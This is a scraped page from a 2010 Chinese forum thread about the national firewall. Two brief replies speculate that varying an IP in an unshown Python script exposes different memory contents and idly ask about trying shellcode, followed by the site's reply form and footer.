							<em onclick="$('postmessage_864126').className='t_smallfont'">小</em>												发表于 2010-10-10 15:26&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=6518" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_48"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_48"></div><div id="ad_thread4_48"></div>
						
						
																											<div id="postmessage_864126" class="t_msgfont"><div class="quote"><h5>引用:</h5><blockquote>原帖由 <i>lehui99</i> 于 2010-10-10 15:17 发表 <a href="https://1984bbs.com/redirect.php?goto=findpost&amp;pid=864105&amp;ptid=59769" target="_blank"><img src="https://1984bbs.com/images/common/back.gif" border="0" onclick="zoom(this, this.src)" onload="attachimg(this, 'load')" alt="" /></a><br />
发现填写不同的国外IP能看到不同的内容，把python脚本中的IP：218.30.54.118换成其他的IP（比如yahoo.com的IP）会看到大部分不同的内容。 </blockquote></div>估计飞指针飞到不同的内存区域了。有人去试试shellcode没？</div>

							
							
							
							
															<div id="post_rate_div_864126"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo864126_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=6518" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=864126&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 864126)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_48"></div>				</div>
			</td>
		</tr>
		</table>
				</div>
	<div class="mainbox viewthread">
			<table id="pid864182" summary="pid864182" cellspacing="0" cellpadding="0">
			<tr>
				<td class="postauthor">
					 					<cite>											<a href="space.php?uid=16941" target="_blank" id="userinfo864182" class="dropmenu" onmouseover="showMenu(this.id)">萧尧猫</a></cite>
																		<p><em></em></p>
						<p></p>
						<p class="customstatus">既宅又腐、猫控、无党派人士、不同政见者、@ho_kitty</p>												
						<ul>
												<!-- <li class="pm"><a href="pm.php?action=send&amp;uid=16941">发短消息</a></li> -->
						<!-- <li class="buddy"><a href="my.php?item=buddylist&amp;newbuddyid=16941&amp;buddysubmit=yes" target="_blank" id="ajax_buddy_49" onclick="ajaxmenu(event, this.id, 3000, 0)">加为好友</a></li> -->

						
						</ul>
									</td>
				<td class="postcontent" >
					<div class="postinfo">
						<strong title="复制话题链接到剪贴板" id="postnum864182" onclick="setcopy('https://1984bbs.com/viewthread.php?tid=59769&page=1#pid864182', '话题链接已经复制到剪贴板')">50楼</strong>
													<em onclick="$('postmessage_864182').className='t_bigfont'">大</em>							<em onclick="$('postmessage_864182').className='t_msgfont'">中</em>
							<em onclick="$('postmessage_864182').className='t_smallfont'">小</em>												发表于 2010-10-10 15:54&nbsp;																					<a href="viewthread.php?tid=59769&amp;page=1&amp;authorid=16941" rel="nofollow">只看该作者</a>
																		</div>
					<div id="ad_thread2_49"></div>					<div class="postmessage defaultpost">
																		<div id="ad_thread3_49"></div><div id="ad_thread4_49"></div>
						
						
																											<div id="postmessage_864182" class="t_msgfont">完全看不懂.......</div>

							
							
							
							
															<div id="post_rate_div_864182"></div>
																</div>
							</td>
		</tr>
		<tr>
			<td class="postauthor">
								<div class="popupmenu_popup userinfopanel" id="userinfo864182_menu" style="display: none;">
										<dl></dl>
										<p><a href="space.php?uid=16941" target="_blank">查看详细资料</a></p>
														</div>
							</td>
			<td class="postcontent">
				<div class="postactions">
										<p>
																			<a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;repquote=864182&amp;extra=&amp;page=1">引用</a>
																																											<a href="###" onclick="fastreply('回复 # 的话题', 864182)">回复</a>
																		<strong onclick="scroll(0,0)" title="顶部">TOP</strong>
					</p>
					<div id="ad_thread1_49"></div>				</div>
			</td>
		</tr>
		</table>
		</div>
</form>





<div class="pages_btns">
	<div class="threadflow"><a href="redirect.php?fid=26&amp;tid=59769&amp;goto=nextoldset"> &#8249;&#8249; 上一主题</a> | <a href="redirect.php?fid=26&amp;tid=59769&amp;goto=nextnewset">下一主题 &#8250;&#8250;</a></div>
	<div class="pages"><em>&nbsp;51&nbsp;</em><strong>1</strong><a href="viewthread.php?tid=59769&amp;extra=&amp;page=2">2</a><a href="viewthread.php?tid=59769&amp;extra=&amp;page=2" class="next">&rsaquo;&rsaquo;</a></div>			<span class="postbtn" id="newspecialtmp" onmouseover="$('newspecial').id = 'newspecialtmp';this.id = 'newspecial';showMenu(this.id)"><a href="post.php?action=newthread&amp;fid=26&amp;extra="><img src="images/default/newtopic.gif" border="0" alt="发新话题" title="发新话题" /></a></span>
		<span class="replybtn"><a href="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;extra="><img src="images/default/reply.gif" border="0" alt="" /></a></span></div>

<!--精华贴打标记-->

	<script src="include/javascript/post.js" type="text/javascript"></script>
	<script type="text/javascript">
	var postminchars = parseInt('2');
	var postmaxchars = parseInt('1000000');
	var disablepostctrl = parseInt('0');
	var charset = 'gbk';
	function validate(theform) {
		if(theform.message.value == '' && theform.subject.value == '') {
			alert("请完成标题或内容栏。");
			theform.message.focus();
			return false;
		} else if(mb_strlen(theform.subject.value) > 80) {
			alert("您的标题超过 80 个字符的限制。");
			theform.subject.focus();
			return false;
		}
		if(!disablepostctrl && ((postminchars != 0 && mb_strlen(theform.message.value) < postminchars) || (postmaxchars != 0 && mb_strlen(theform.message.value) > postmaxchars))) {
			alert("您的话题长度不符合要求。\n\n当前长度: "+mb_strlen(theform.message.value)+" 字节\n系统限制: "+postminchars+" 到 "+postmaxchars+" 字节");
			return false;
		}
		if(!fetchCheckbox('parseurloff')) {
			theform.message.value = parseurl(theform.message.value, 'bbcode');
		}
		theform.replysubmit.disabled = true;
		return true;
	}
	</script>
<!--精华贴打标记-->

	<form method="post" id="postform" action="post.php?action=reply&amp;fid=26&amp;tid=59769&amp;extra=&amp;replysubmit=yes" onSubmit="return validate(this)">
		<input type="hidden" name="formhash" value="823c9fa2" />
		<div id="quickpost" class="box">
			
			<h4>快速回复主题</h4>
			<div class="postoptions">
&nbsp;
			</div>
			<div class="postform">
				<h5><label>标题
				<input type="text" name="subject" value="" tabindex="1"></label></h5>
				<p><label>内容</label>
				<textarea rows="7" cols="80" class="autosave" name="message" id="message" onKeyDown="ctlent(event);" tabindex="2"></textarea>
				</p>
				<p class="btns">
					<button type="submit" name="replysubmit" id="postsubmit" value="replysubmit" tabindex="3">发表话题</button>[完成后可按 Ctrl+Enter 发布]&nbsp;
					<a href="###" id="previewpost" onclick="$('postform').action=$('postform').action + '&previewpost=yes';$('postform').submit();">预览话题</a>&nbsp;
					<a href="###" id="restoredata" title="恢复上次自动保存的数据" onclick="loadData()">恢复数据</a>&nbsp;
					<a href="###" onclick="$('postform').reset()">清空内容</a>
				</p>
			</div>
						<script type="text/javascript">
				var textobj = $('message');
				window.onbeforeunload = function () {saveData(textobj.value)};
				if(is_ie >= 5 || is_moz >= 2) {
					lang['post_autosave_none'] = "没有可以恢复的数据！";
					lang['post_autosave_confirm'] = "此操作将覆盖当前话题内容，确定要恢复数据吗？";
				} else {
					$('restoredata').style.display = 'none';
				}
			</script>
		</div>
	</form>
	<div class="popupmenu_popup" id="forumlist_menu" style="display: none">
		<dl><dt><a href="index.php?gid=3">沙龙</a></dt><dd><ul><li><a href="forumdisplay.php?fid=2">自由新闻社</a></li><li><a href="forumdisplay.php?fid=37">雅典学院</a></li><li><a href="forumdisplay.php?fid=21">开放社会资料室</a></li><li class="current"><a href="forumdisplay.php?fid=26">国家局域网研究所</a></li><li><a href="forumdisplay.php?fid=35">罗马假日公寓</a></li><li><a href="forumdisplay.php?fid=40">Live!大讲堂</a></li></ul></dd></dl><dl><dt><a href="index.php?gid=11">站务</a></dt><dd><ul><li><a href="forumdisplay.php?fid=9">多功能小黑屋</a></li></ul></dd></dl>	</div>

<script type="text/javascript">
var maxpage = 2;
if(maxpage > 1) {
	document.onkeyup = function(e){
		e = e ? e : window.event;
		var tagname = is_ie ? e.srcElement.tagName : e.target.tagName;
		if(tagname == 'INPUT' || tagname == 'TEXTAREA') return;
		actualCode = e.keyCode ? e.keyCode : e.charCode;
				if(actualCode == 39) {
			window.location = 'viewthread.php?tid=59769&page=2';
		}
					}
}
</script></div>	<div class="ad_footerbanner" id="ad_footerbanner1"></div>
	<div class="ad_footerbanner" id="ad_footerbanner2"><b> 顾问</b>：莫之许、北风、不锈钢老鼠、温克坚、艾未未、冉云飞、安替、崔卫平、闾丘露薇、章立凡 <b> 形象代言</b>：宋石男  <b>法律顾问</b>：浦志强  <b> <br>编辑</b>：张书记、上肛上腺、抑扬、musicool、王祖贤、alix001、核子力量、四夕亚日、炽鸢侯、木火 <br><b>技术</b>：库存袈裟、麦圆、散光     <br> </div>
	<div class="ad_footerbanner" id="ad_footerbanner3"></div>

<div id="footer">
	<div class="wrap">
		<div id="footlinks">

			<p>
				<a href="viewthread.php?tid=23826" target="_blank">浏览器支持说明</a>　|　<a href="member.php?action=clearcookies&amp;formhash=823c9fa2">清除 Cookies</a>
				
							</p>
		</div>
		<p id="copyright">
			CopyRight &#169; 1984bbs.com </p><p id="debuginfo">Processed in  second(s),  queries, Gzip enabled.</p>

	</div>
</div>
</body>
</html>